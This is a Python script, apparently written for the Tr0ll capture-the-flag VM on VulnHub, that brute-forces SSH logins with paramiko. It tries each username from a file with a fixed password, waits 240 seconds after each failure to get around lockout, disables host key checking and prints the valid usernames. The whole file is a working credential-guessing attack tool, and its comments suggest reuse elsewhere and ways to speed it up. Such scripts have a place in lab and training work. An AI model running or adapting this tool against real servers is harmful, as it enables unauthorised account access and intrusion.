# wrote this for tr0ll vm from vulnhub.com; could be usefull elsewhere :)
from __future__ import print_function #for proper display of stop_watch function

import paramiko
import time

from sys import argv, stdout

start_time = time.time()

def stop_watch(seconds): # loops for 240 seconds to avoid resetting ssh server and usernames
    start = time.time() #time since epoch
    elapsed = 0 #set elapsed to zero before loop
    while elapsed < seconds: #exit function after 240 seconds
        elapsed = time.time() - start # time since epoch(earlier) - time since epoch(currently)
        print('%02d : %02d seconds' % (elapsed, seconds), end='\r') #carriage return to keep output small
        stdout.flush() #force output to cmdline before python exits
        time.sleep(1) # add one second to elapsed

def read_userlist(user_list):
    return [word for line in open(user_list, 'r') for word in line.rstrip('\n').split()] #reads lines of user_file and puts in array, also strips newline chars

if len(argv) < 2: #print usage if too few arguments
    print("Usage: %s [server address] [user_file] [OPTIONAL pass_file]" % argv[0])
    exit(0)

pass_file = "Pass.txt" #gonna expand on this if I use this script again, in this case, the password was literally Pass.txt not a file.

ssh = paramiko.SSHClient() #put client into ssh variable for ease of use
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Allow connections to any host without checking known_hosts file

#Should change this to try twice before waiting for 240 seconds, the attack would be much faster!
for i in read_userlist(argv[2]): #loop through array returned by read_userlist()
    print("Trying Username: %s" % i)
    try:
        ssh.connect(argv[1], username=i,password=pass_file)
    except paramiko.AuthenticationException: #if creds are wrong wait 240 seconds
        print("[-] Authentication Exception! ...")
        print("Sleeping for 240 seconds to avoid closing/resetting port/username\n")
        stop_watch(240)
    except paramiko.SSHException: #if some other ssh error wait 240 seconds
        print("[-] SSH Exception! ...")
        print("Sleeping for 240 seconds to avoid closing/resetting port/username\n")
        stop_watch(240)
    else:
        print("[+] Found Username: %s" %i) #will print only valid usernames
process_time = time.time() - start_time
print("Whole bruteforce took: %03d seconds." % process_time) #just for fun :), will tell you how long the whole process took
